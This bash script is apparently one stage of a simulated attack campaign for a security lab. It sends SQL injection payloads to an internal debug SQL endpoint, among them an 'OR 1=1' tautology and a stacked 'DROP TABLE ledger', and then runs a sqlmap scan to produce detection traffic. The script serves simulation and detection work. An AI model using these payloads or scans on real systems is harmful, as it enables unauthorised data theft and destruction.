#!/bin/bash
set -uo pipefail
source "$(dirname "$0")/common.sh"

# Stage 3: abuse the "debug" SQL endpoint advertised in transactions'
# swagger.json (discovered by harvest_credentials.sh). It's documentation
# bait more than a live backend in this static lab, so the interesting
# signal is the attempt itself -- a probe/injection pattern landing on an
# app-tier service straight after a dmz->app-tier pivot.
if ! have_pivot; then
  log "DEBUG-SQL" "No app-tier route yet -- skipping"
  exit 0
fi

TRANSACTIONS_HTTP="http://${TRANSACTIONS_IP}:80"
ENDPOINT="${TRANSACTIONS_HTTP}/internal/debug/sql"

log "DEBUG-SQL" "Probing undocumented-to-outsiders endpoint $ENDPOINT"

PAYLOADS=(
  '{"query":"SELECT * FROM ledger LIMIT 50"}'
  '{"query":"SELECT * FROM ledger WHERE account_id = 1 OR 1=1"}'
  '{"query":"SELECT * FROM ledger; DROP TABLE ledger;--"}'
  '{"query":"SELECT version(), current_user"}'
)

for p in "${PAYLOADS[@]}"; do
  code=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$ENDPOINT" \
    -H 'Content-Type: application/json' -d "$p")
  log "DEBUG-SQL" "POST body=${p} -> ${code}"
  sleep 1
done

# Also let sqlmap crawl/fuzz the same body for completeness -- against a
# real backend this is where it would confirm/exploit the injection, here
# it just adds realistic tool fingerprinting traffic to the target's log.
sqlmap -u "$ENDPOINT" --method=POST --data='{"query":"1"}' \
  --headers='Content-Type: application/json' \
  --batch --level=2 --risk=1 \
  --output-dir="$LOG_DIR/sqlmap" \
  2>&1 | tee -a "$LOG_DIR/attacker-campaign.log"

log "DEBUG-SQL" "debug-sql abuse complete"
